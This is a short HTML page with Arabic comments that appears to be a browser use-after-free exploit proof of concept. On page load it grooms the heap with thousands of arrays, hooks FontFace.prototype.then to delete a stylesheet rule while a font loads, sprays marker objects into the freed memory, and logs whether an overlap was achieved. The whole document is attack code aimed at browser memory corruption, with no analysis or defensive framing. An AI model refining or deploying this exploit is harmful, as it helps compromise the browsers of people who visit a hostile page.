<script>
    let sprayedObjects = [];
    let noise = [];

    // 1. الترتيب المسبق (Defrag): خلق فجوات في الذاكرة
    function preGroom() {
        for (let i = 0; i < 5000; i++) {
            noise.push(new Array(0x10).fill(0x41414141)); 
        }
        // مسح نصف الفجوات لترك أماكن فارغة (Holes) جاهزة للكائن الذي سنحذفه
        for (let i = 0; i < 2500; i += 2) {
            noise[i] = null; 
        }
    }

    function createExploitObject() {
        // حجم المصفوفة هنا يحدد حجم الكائن في الذاكرة بدقة (128-byte block target)
        return {
            padding: new Array(16).fill(0x1337), // تلاعب بحجم الـ Padding
            marker: 0xDEADBEEF
        };
    }

    function triggerUAF() {
        preGroom(); // ترتيب الذاكرة أولاً

        let font = new FontFace('TargetFont', 'local(Arial)', { unicodeRange: 'U+0041' });
        document.fonts.add(font);

        Object.defineProperty(FontFace.prototype, 'then', {
            get() {
                document.getElementById('fontStyle').sheet.deleteRule(0);
                
                // الحقن الفوري: Spray مكثف
                for (let i = 0; i < 2000; i++) {
                    sprayedObjects.push(createExploitObject());
                }
                return undefined;
            }
        });

        font.load();
    }

    // تحقق من الذاكرة
    function verify() {
        let overlap = false;
        for (let i = 0; i < sprayedObjects.length; i++) {
            if (sprayedObjects[i].marker !== 0xDEADBEEF) {
                overlap = true;
                console.log("SUCCESS: Memory overlap at " + i);
                break;
            }
        }
        if (!overlap) console.log("Status: Still intact. Need to tune Array size.");
    }

    window.onload = () => { setTimeout(triggerUAF, 1000); setTimeout(verify, 3000); };
</script>
